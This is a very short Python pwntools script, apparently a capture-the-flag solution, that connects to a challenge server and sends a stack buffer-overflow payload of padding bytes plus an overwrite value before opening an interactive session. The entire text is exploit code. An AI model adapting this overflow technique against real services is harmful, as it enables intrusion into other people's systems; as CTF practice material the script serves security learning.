from pwn import *
r = remote("chall.pwnoh.io",13372)

payload = b"A" * (0x38+4) + b"EEEE"
r.sendline(payload)

r.interactive()